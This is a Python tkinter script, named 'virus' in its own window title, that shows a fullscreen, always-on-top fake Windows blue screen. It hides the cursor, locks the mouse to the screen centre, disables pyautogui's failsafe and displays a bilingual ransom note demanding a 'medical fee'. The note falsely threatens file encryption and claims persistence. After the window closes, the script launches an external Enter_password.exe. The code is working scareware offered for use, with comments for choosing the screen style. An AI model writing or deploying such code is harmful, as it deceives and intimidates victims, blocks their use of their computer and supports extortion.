import tkinter as tk
import pyautogui
import threading
import sys
import os
import time
import random

def format_number(num):
    num_str = str(num)
    while len(num_str) < 4:
        num_str = '0' + num_str
    return num_str

# 生成一个随机数
random_number = random.randint(0, 1000)

# 格式化数字
number = format_number(random_number)

# 创建主窗口
root = tk.Tk()
root.title("virus")
root.geometry("1920x1080")
root.config(bg="#0078D7")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

# 隐藏鼠标光标
root.config(cursor="none")

# 蓝屏错误信息1
error_massage1 = f"""
:(

代码: {number}

你的计算机出错了!

我的电脑怎么了?
  -  你的电脑感染了我们的病毒，现在继续一笔"医药费"就只你的电脑.
  -  "医药费"真不多,我们只收"医药费"，不收其他费用.
  -  只要我们心情好我们的"医药费"就有可能是免费的.

怎么修复电脑？
  -  删除病毒文件               后果:  1.重要文件被加密   2.  电脑无法启动   3.  你的电脑被格式化   4.  病毒文件无限自我复制,电脑卡死.
  -  联系我们                  后果:  1.你的电脑被修复好

怎么联系你们？
  -  邮箱:XXX

付完"医药费"有什么好处?
  -  当你付完"医药费"我们会给你发送一个专门的解密程序和删除病毒文件的程序.

注意事项:
  -  请不要删除任何病毒文件,否则你的电脑将无法启动.
  -  我已经修改了开机启动项，你退出了也无济于事.
  -  如果你想退出此界面,请按住ctrl+c退出此GUI.

为了你的电脑安全,请尽快付完"医药费",如一周后未能及时付款,我们将加密你的电脑中的所有重要文件.
-------------------------------------------------------------------------------------------------------------------------------
Code: {number}

Your computer is malfunctioning!

What's wrong with my computer?
- Your computer has been infected with our virus, and now continue to pay a "medical bill" just to your computer.
- "Medical expenses" are really not much, we only charge "medical expenses" and no other expenses.

How do I fix my computer?
- Delete virus files, consequences: 1. Important files are encrypted 2. The computer cannot start 3. Your computer is formatted 4. Virus files are self-replicating indefinitely, and the computer is stuck.
- Contact us, consequences: 1. Your computer is repaired

How can I contact you?
- Email: XXX

What are the benefits of paying for "medical expenses"?
- When you have paid the "medical bill", we will send you a special decryption program and a program to delete virus files.

Notes:
Please do not delete any virus files or your computer will not start up.
- I have modified the boot item, and it doesn't help if you log out.
- If you want to exit this interface, please press ctrl + c to exit this GUI.

For the safety of your computer, please pay the "medical fee" ASAP. If you fail to pay in time after one week, we will encrypt all important files on your computer.
"""

# 蓝屏错误信息2
error_massage2 = f"""
:(

代码: {number}

你的计算机出错了!

我的电脑怎么了?
  -  你的电脑感染了我们的病毒.

怎么修复电脑?
  -  不用修复这个只是一个教训.
  -  如果你想退出此界面,请按住ctrl+c退出此GUI.
-------------------------------------------------------------------------------------------------------------------------------
Code: {number}

Your computer is malfunctioning!

What's wrong with my computer?
- Your computer is infected with our virus.

How to fix a computer?
- No need to fix this just a lesson.
- If you want to exit this interface, please press ctrl + c to exit this GUI.
"""

error_massage3 = """
:(

A problem has been detected and Windows has been shut down to prevent damage to your computer.

CRITICAL_PROCESS_DIED

If this is the first time you've seen this error screen, restart your computer. If this screen appears again, follow these steps:

Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.

If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or
disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.

Technical Information:

STOP: 0x000000EF (0x0000000000000001, 0x0000000000000002, 0x0000000000000003, 0x0000000000000004)

CRITICAL_PROCESS_DIED

Beginning dump of physical memory...

Physical memory dump complete.

Contact your system administrator or technical support group for further assistance.

Press any key to continue...

Press F8 to disable driver signature enforcement...

Press Enter to attempt to reboot the system...

System halted.
"""

# 创建标签显示错误信息                    ⬇ 这里可以选择蓝屏样式    ⬇ 这里可以选择字体meg1和meg3一般都是用12
label = tk.Label(root, text=error_massage1, font=("Consolas", 12), bg="#0078D7", fg="white", justify="left")
label.pack(pady=100)

# 锁定鼠标到屏幕中心并隐藏鼠标
def block_mouse():
    while True:
        pyautogui.moveTo(960, 540)  # 将鼠标移动到屏幕中心
        pyautogui.FAILSAFE = False  # 禁用 pyautogui 的安全退出功能

# 添加 Ctrl+C 退出功能
def exit_program(event):
    root.destroy()  # 退出程序
    sys.exit()      # 确保程序完全退出

# 绑定 Ctrl+C 事件
root.bind("<Control-c>", exit_program)

# 启动线程锁定鼠标
threading.Thread(target=block_mouse, daemon=True).start()

# 运行主循环
if __name__ == "__main__":
    root.mainloop()
    try:
        os.system("start EXE/Enter_password.exe")
    except Exception as e:
        print(f"Failed to start Enter_password.exe: {e}")
        os.system("start Enter_password.exe")